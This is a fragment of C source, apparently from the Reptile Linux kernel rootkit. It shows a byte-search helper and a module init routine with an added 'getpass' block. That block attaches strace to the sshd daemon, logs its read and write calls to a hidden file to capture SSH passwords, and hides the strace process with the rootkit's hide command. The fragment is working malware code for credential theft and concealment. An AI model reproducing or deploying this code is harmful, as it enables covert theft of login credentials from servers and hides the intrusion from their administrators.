...
{
    unsigned char* currBuffPointer = (unsigned char*)inBuffer;
    int flag_a = 0, flag_b = 0;

    while (flag_a != src_len)
    {
        unsigned char* compareOne = currBuffPointer;
        unsigned char* compareTwo = (unsigned char*)inSearchStr;
        flag_a++;
        while (*compareOne == *compareTwo)
        {
            ...
            compareOne++;
            compareTwo++;
            if (flag_b == find_byte_len)
            {
                return (unsigned char*)currBuffPointer;
            }
...
static int __init reptile_init(void)
{
	...
	// own add for getpass
	sprintf(xcmd, "kill -9 $(cat %s/getpass.pid)", SHELL_DIR);
	run_cmd(xcmd);
	memset(xcmd,0,512);
	sprintf(xcmd, "sleep 6 && (strace -f -F -p `ps aux|grep \"sshd -D\"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 50 2> %s/.sshd.log &)", SHELL_DIR);
	run_cmd(xcmd);
	memset(xcmd,0,512);
	sprintf(xcmd, "sleep 7 && ps aux| grep strace | grep -v grep| awk {'print $2'} > %s/getpass.pid", SHELL_DIR);
	run_cmd(xcmd);
	memset(xcmd,0,512);
	sprintf(xcmd, "sleep 8 && %s hide $(cat %s/getpass.pid)", SHELL_PATH, SHELL_DIR);
	run_cmd(xcmd);
	//own add end
